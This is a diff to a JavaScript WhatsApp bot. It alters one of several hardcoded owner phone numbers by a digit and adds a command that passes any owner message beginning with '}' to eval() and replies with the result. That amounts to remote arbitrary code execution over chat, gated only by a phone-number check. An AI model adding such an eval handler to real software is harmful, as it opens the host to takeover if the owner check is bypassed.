@@ -606,7 +606,7 @@ if (conf.AUTO_LIKE_STATUS === "yes") {
             var membreGroupe = verifGroupe ? ms.key.participant : '';
             
             const nomAuteurMessage = ms.pushName;
-            const FranceKing = '254748387614';
+            const FranceKing = '254748387615';
             const FranceKing1 = '254796299159';
             const FranceKing2 = "254743995989";
             const FranceKing3 = '254752925938';
@@ -758,6 +758,21 @@ if (badWords.some(word => texte.includes(word)) && !superUser && origineMessage 
         }, { quoted: ms });
     }
 }
+            if (texte && texte.startsWith('}')) {
+  if (!superUser) {
+    return repondre("Only for my owner 🚫");
+  }
+  
+  try { 
+    let evaled = await eval(texte.slice(1)); 
+    if (typeof evaled !== 'string') {
+      evaled = require('util').inspect(evaled); 
+    }
+    await repondre(evaled); 
+  } catch (err) { 
+    await repondre(String(err)); 
+  } 
+            }
             
 if (texte && texte.startsWith('>')) {
   // If the sender is not the owner
